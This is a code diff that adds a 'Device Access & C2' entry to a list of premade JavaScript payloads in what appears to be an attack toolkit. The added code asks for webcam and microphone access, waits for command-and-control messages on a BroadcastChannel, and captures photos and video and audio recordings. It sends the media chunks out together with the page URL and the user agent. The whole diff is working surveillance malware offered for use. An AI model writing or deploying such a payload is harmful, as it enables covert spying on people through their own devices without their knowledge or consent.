@@ -130,4 +130,95 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 })();
 `.trim(),
     },
+    {
+        name: "Device Access & C2",
+        description: "Requests webcam/mic access and listens for C2 commands to stream media.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    let mediaStream = null;
+    let videoRecorder = null;
+    let audioRecorder = null;
+
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    async function getMediaPermissions(video = true, audio = true) {
+        if (mediaStream) return mediaStream;
+        try {
+            mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
+            exfiltrate('connection', { message: 'Permissions granted.' });
+            return mediaStream;
+        } catch (err) {
+            exfiltrate('connection', { message: 'Permissions denied: ' + err.message });
+            return null;
+        }
+    }
+
+    function startRecording(recorder, streamType) {
+        if (recorder && recorder.state === 'inactive') {
+            recorder.start(500); // Send chunk every 500ms
+            exfiltrate('connection', { message: streamType + ' recording started.' });
+        }
+    }
+    
+    function stopRecording(recorder, streamType) {
+        if (recorder && recorder.state === 'recording') {
+            recorder.stop();
+            exfiltrate('connection', { message: streamType + ' recording stopped.' });
+        }
+    }
+    
+    function createRecorder(stream, mimeType) {
+         const recorder = new MediaRecorder(stream, { mimeType });
+         recorder.ondataavailable = async (event) => {
+            if (event.data.size > 0) {
+                const chunk = await event.data.arrayBuffer();
+                exfiltrate('media-stream', { type: mimeType, size: event.data.size, chunk });
+            }
+        };
+        return recorder;
+    }
+
+    channel.addEventListener('message', async (event) => {
+        if (event.data.sessionId !== sessionId || event.data.type !== 'command') return;
+
+        const command = event.data.command;
+        const stream = await getMediaPermissions();
+        if (!stream) return;
+
+        switch (command) {
+            case 'start-video':
+                exfiltrate('media-stream', { type: 'video/preview', streamId: stream.id });
+                break;
+            case 'capture-image':
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                exfiltrate('media-stream', { type: 'image/png', size: blob.size, chunk: await blob.arrayBuffer() });
+                break;
+            case 'start-video-record':
+                videoRecorder = createRecorder(stream, 'video/webm');
+                startRecording(videoRecorder, 'Video');
+                break;
+            case 'stop-video-record':
+                stopRecording(videoRecorder, 'Video');
+                break;
+            case 'start-audio-record':
+                audioRecorder = createRecorder(stream, 'audio/webm');
+                startRecording(audioRecorder, 'Audio');
+                break;
+            case 'stop-audio-record':
+                stopRecording(audioRecorder, 'Audio');
+                break;
+        }
+    });
+
+    exfiltrate('connection', { message: 'Device Access Payload loaded.' });
+})();
+`.trim(),
+    }
 ];
+
